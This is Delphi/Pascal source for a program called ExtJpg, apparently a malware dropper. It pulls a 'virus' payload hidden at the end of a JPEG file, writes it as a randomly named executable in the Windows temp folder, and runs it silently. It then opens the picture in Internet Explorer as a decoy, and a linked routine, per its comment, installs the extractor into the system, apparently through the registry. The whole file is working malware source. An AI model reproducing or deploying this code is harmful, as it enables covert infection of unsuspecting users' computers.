program ExtJpg;

{---------------------------Used functions WinApi------------------------------}
function GetWindowsDirectoryA         (lpBuffer  : PAnsiChar;
                                       uSize     : LongWord):
                                       LongWord; stdcall;external
                                       'kernel32.dll' name'GetWindowsDirectoryA';
function GetModuleFileNameA           (hModule: HINST;
                                       lpFilename: PAnsiChar;
                                       nSize: LongWord):
                                       LongWord; stdcall;external
                                       'kernel32.dll' name 'GetModuleFileNameA';
function CopyFileA                    (lpExistingFileName,
                                       lpNewFileName: PAnsiChar;
                                       bFailIfExists: LongBool):
                                       LongBool; stdcall;external
                                       'kernel32.dll' name 'CopyFileA';
function RegSetValueA                 (hKey: LongWord;
                                       lpSubKey: PAnsiChar;
                                       dwType: LongWord;
                                       lpData: PAnsiChar;
                                       cbData: LongWord):
                                       Longint; stdcall;external
                                       'advapi32.dll' name 'RegSetValueA';
function WinExec                      (lpCmdLine: PAnsiChar;
                                       uCmdShow: LongWord):
                                       LongWord; stdcall;external
                                       'kernel32.dll' name 'WinExec';
procedure ExitProcess                 (uExitCode: LongWord); stdcall;external
                                       'kernel32.dll' name 'ExitProcess'
{------------------------------------------------------------------------------}


{-----------------------Transformation of a line to number---------------------}
function StrToInt(const S: string): Integer;
var
  E: Integer;
begin
  Val(S, Result, E);
end;
{------------------------------------------------------------------------------}

{-------------------Extraction of a virus from a picture-----------------------}
function ExtrVirusFromJpg(jpgfile:string; pathforvirus:string):boolean;
const
     MaxBuf=400000;
     Inf=6;
var  Fjpgfile,Fviruspath:file;
     buf:array [0..MaxBuf] of byte;
     bufInf:array [1..inf] of byte;
     size,i,jpgsize,virussize:integer;
     Svirussize,temp:string;
begin
    Result:=false;
    filemode:=0;
    assign(Fjpgfile,jpgfile);
    reset(Fjpgfile,1);
    jpgsize:=filesize(Fjpgfile);
    seek(Fjpgfile,jpgsize-inf);
    BlockRead(Fjpgfile,bufinf,inf);
    close(Fjpgfile);
    Svirussize:='';
    for i:=1 to inf do Svirussize:=Svirussize+chr(bufInf[i]);
    for i:=1 to Length(Svirussize) do
         begin
            if Svirussize[i]<>' ' then temp:=temp+Svirussize[i];

         end;
    Svirussize:=temp;
    virussize:=StrToInt(Svirussize);
    if virussize<>0 then
    begin
      assign(Fjpgfile,jpgfile);
      reset(Fjpgfile,1);
      seek(Fjpgfile,jpgsize -(inf+virussize));
      BlockRead(Fjpgfile,buf,virussize);
      close(Fjpgfile);

      filemode:=1;

      Assign(Fviruspath,pathforvirus);
      rewrite(Fviruspath,1);
      BlockWrite(Fviruspath,buf,virussize);
      close(Fviruspath);
      Result:=true;
    end;
end;
{------------------------------------------------------------------------------}

var
   Infect                               : boolean;
   filename                             : string;
   i,CH                                 : integer;
   windir                               : Array[0..144] of char;
   {$L jpeg.obj}

   procedure RegWriteAndCopy;external;{Устанавливает экстрактор в систему}

begin
  randomize;
  SetLength(filename,12);
  filename[1]:='J';
  for i:=2 to 8 do
   begin
     ch:=0;
     while (ch<65)or(ch>90) do
      begin
        ch:=random(200);
        filename[i]:=Chr(ch);
      end;
   end;
  filename[9]:='.';
  filename[10]:='e';
  filename[11]:='x';
  filename[12]:='e';
  GetWindowsDirectoryA(windir,SizeOf(windir));
  filename:=windir+'\temp\'+filename;
  if ParamStr(1)<>'' then
  begin
  Infect:=ExtrVirusFromJpg(ParamStr(1),filename);

    case infect of
        true : WinExec(PCHAR(filename),0);
    end;

  WinExec(Pchar('C:\PROGRA~1\INTERN~1\iexplore.exe -nohome '+ParamStr(1)),1);
  end;
  RegWriteAndCopy;
end.






















